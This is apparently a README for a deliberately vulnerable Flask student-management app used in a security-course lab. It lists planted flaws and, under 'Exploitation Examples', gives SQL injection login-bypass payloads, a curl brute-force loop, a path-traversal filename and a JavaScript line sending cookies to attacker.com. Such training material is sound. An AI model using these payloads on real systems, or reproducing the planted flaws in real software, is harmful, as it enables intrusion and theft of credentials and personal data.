# ISRM Project - Vulnerable Application (Phase 2)

## Project Overview

This is a **deliberately vulnerable** Python-Flask application designed for security research, educational purposes, and vulnerability assessment training. It implements a Student Management System with intentional security flaws that align with the vulnerabilities listed in **Annexure 1** of the ISRM curriculum project.

**⚠️ WARNING:** This application contains serious security vulnerabilities. Do NOT deploy in production or expose to untrusted networks.

---

## Vulnerabilities Included

The application intentionally includes **14 major vulnerabilities** covering:

1. **SQL Injection** - Direct database manipulation
2. **Brute Force & Credential Stuffing** - No rate limiting
3. **Weak Authentication** - Hardcoded credentials
4. **Insecure Password Storage** - Plain text passwords
5. **Sensitive Data Exposure** - SSN, passwords visible
6. **Insecure File Upload** - Arbitrary file upload
7. **Path Traversal** - Directory traversal attacks
8. **Session Hijacking** - Insecure cookies
9. **Cross-Site Request Forgery (CSRF)** - No token protection
10. **Information Disclosure** - Verbose error messages
11. **Missing Access Control** - No RBAC implementation
12. **Privilege Escalation** - Role checks bypassed
13. **Command Injection** - Potential OS command execution
14. **Insecure Deserialization** - Session tampering

See [VULNERABILITIES.md](VULNERABILITIES.md) for detailed documentation.

---

## Project Structure

```
ISRM_Proj/
├── README.md                      # This file
├── VULNERABILITIES.md             # Detailed vulnerability documentation
├── requirements.txt               # Python dependencies
├── app.py                         # Main Flask application (main vulnerability container)
├── config.py                      # Configuration with weak security settings
├── database.py                    # Database operations with SQL injection
├── test_vulnerabilities.py        # Automated vulnerability testing script
├── templates/
│   └── login.html                 # Login form HTML template
├── uploads/                       # Directory for file uploads (created on startup)
└── vulnerable_app.db              # SQLite database (auto-generated on first run)
```

---

## File Descriptions

### **app.py** - Main Application
- Flask web server with multiple endpoints
- Routes: `/login`, `/dashboard`, `/students`, `/add_student`, `/search`, `/upload`, `/download`, `/logs`
- Contains: SQL injection, CSRF vulnerabilities, missing access control

### **database.py** - Database Layer
- SQLite database operations
- Contains severe SQL injection vulnerabilities
- Stores plain-text passwords and sensitive data
- Logs passwords and personal information

### **config.py** - Configuration
- Weak Flask configuration
- Insecure session settings
- Hardcoded secret key
- Allows dangerous file uploads

### **test_vulnerabilities.py** - Automated Testing
- Tests for SQL injection, brute force, weak credentials
- Demonstrates common vulnerability exploitation techniques
- Educational tool for Phase 3 (Vulnerability Assessment)

### **templates/login.html** - Login Interface
- HTML login form
- Displays test credentials (security bad practice)
- Vulnerable to CSRF and SQL injection

---

## Installation & Setup

### Prerequisites
- Python 3.7+
- pip (Python package manager)
- Windows/Linux/macOS

### Installation Steps

1. **Navigate to the project directory:**
```bash
cd c:\Users\Snehal\Documents\GitHub\ISRM_Proj
```

2. **Create a Python virtual environment (recommended):**
```bash
# Windows
python -m venv venv
venv\Scripts\activate

# Linux/macOS
python3 -m venv venv
source venv/bin/activate
```

3. **Install dependencies:**
```bash
pip install -r requirements.txt
```

4. **Run the application:**
```bash
python app.py
```

You should see:
```
[*] Database initialized successfully
 * Running on http://0.0.0.0:5000
```

---

## Usage

### Accessing the Application

1. **Open your browser and navigate to:**
   ```
   http://localhost:5000
   ```

2. **You'll be redirected to the login page**

3. **Login with test credentials:**
   - Username: `admin` | Password: `admin123`
   - Username: `user` | Password: `password`

### Available Features

After logging in, you can access:

1. **View Students** (`/students`)
   - Lists all student records
   - Shows SSN (sensitive data exposure)

2. **Add Student** (`/add_student`)
   - Add new student records
   - No input validation (SQL injection possible)

3. **Search Students** (`/search`)
   - Search by name, roll number, or email
   - SQL injection vulnerability in search term

4. **Student Details** (`/student/<id>`)
   - View individual student information
   - Shows passwords and SSN

5. **Upload File** (`/upload`)
   - Upload files to the server
   - File type validation missing
   - Path traversal possible

6. **View Logs** (`/logs`)
   - System activity logs
   - Contains sensitive information
   - No access control (any user can see)

---

## Exploitation Examples

### 1. SQL Injection in Login

**Payload:**
```
Username: admin' --
Password: (anything)
```

**Result:** Bypasses authentication

### 2. SQL Injection in Search

**Payload:**
```
Search: ' OR 1=1 --
```

**Result:** Returns all student records

### 3. Brute Force Attack

```bash
for i in {1..1000}; do
  curl -X POST http://localhost:5000/login \
    -d "username=admin&password=password_$i"
done
```

**Result:** No rate limiting, all attempts succeed/fail without restriction

### 4. File Upload - Arbitrary Executable

Upload file: `malware.exe` or `shell.sh`

**Result:** File uploaded and stored, can be executed

### 5. Path Traversal in Upload

**Filename:**
```
../../../config.py
```

**Result:** Can upload files outside intended directory

### 6. Session Cookie Theft

JavaScript in injected page:
```javascript
document.location = 'http://attacker.com/steal?c=' + document.cookie;
```

**Result:** Session cookies transmitted insecurely

---

## Testing with Automated Script

Run the automated vulnerability testing tool:

```bash
python test_vulnerabilities.py
```

This script will:
- Test SQL injection in login
- Test brute force protection
- Verify weak credentials
- Check session cookie security
- Test file upload vulnerabilities
- Test path traversal
- Check access control

---

## Database Structure

### Users Table
```sql
id | username | password | email | role | created_at
1  | admin    | admin123 | ...   | admin | ...
2  | user     | password | ...   | user  | ...
```

### Students Table
```sql
id | roll_no | name | email | phone | address | ssn | gpa | password | created_at
```

### Logs Table
```sql
id | action | username | details | ip_address | created_at
```

---

## Security Issues Summary

| Category | Issue | Severity | CVSS |
|----------|-------|----------|------|
| Authentication | Weak credentials, no hashing | High | 8.0 |
| Injection | SQL injection (3 locations) | Critical | 9.0 |
| File Upload | No validation, path traversal | High | 8.5 |
| Session | Insecure cookies, no HTTPS | High | 8.0 |
| Access Control | No RBAC, missing authorization | High | 7.2 |
| Data Exposure | SSN, passwords visible | High | 8.1 |
| Logic | No CSRF protection | High | 7.0 |

---

## Next Phases

### Phase 3 - Vulnerability Assessment
- Scan with Bandit (Python security scanner)
- Scan with OWASP ZAP
- Document findings with CVSS scores

### Phase 4 - CI/CD Integration
- Integrate Bandit into CI/CD pipeline
- Automate security checks

### Phase 5 - Threat Modeling
- Map vulnerabilities to STRIDE framework
- Create threat model diagram

### Phase 6 - Risk Quantification
- Calculate ALE (Annualized Loss Expectancy)
- Risk register for top vulnerabilities

### Phase 7 - Control Design
- Fix vulnerabilities
- Implement security controls

### Phase 8 - Retesting
- Re-scan after fixes
- Verify control effectiveness

---

## Important Notes

1. **Database Reset:** Delete `vulnerable_app.db` to reset to initial state
2. **Upload Directory:** Files uploaded to `./uploads/` directory
3. **Debug Mode:** Application runs with `debug=True` (exposes sensitive info)
4. **No HTTPS:** Uses HTTP only (not secure)
5. **Hardcoded Secrets:** Secret key visible in source code

---

## Educational Value

This application is ideal for:
- ✅ Learning common web vulnerabilities
- ✅ Understanding OWASP Top 10
- ✅ Practicing security testing tools
- ✅ Developing security awareness
- ✅ Building secure coding skills
- ✅ Compliance and risk assessment training

---

## Disclaimer

This application is provided **SOLELY for authorized security testing and educational purposes**. 

**DO NOT:**
- Use on systems without explicit written permission
- Deploy to production environments
- Expose to untrusted networks
- Use against systems you do not own

**Unauthorized access to computer systems is illegal.**

---

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE List: https://cwe.mitre.org/
- STRIDE Threat Modeling: https://en.wikipedia.org/wiki/STRIDE_(security)
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1

---

## Contact & Support

For questions or improvements, please refer to the project documentation and the vulnerability assessment guides.

**Last Updated:** 2026-04-08
**Version:** 1.0


#testing webhook

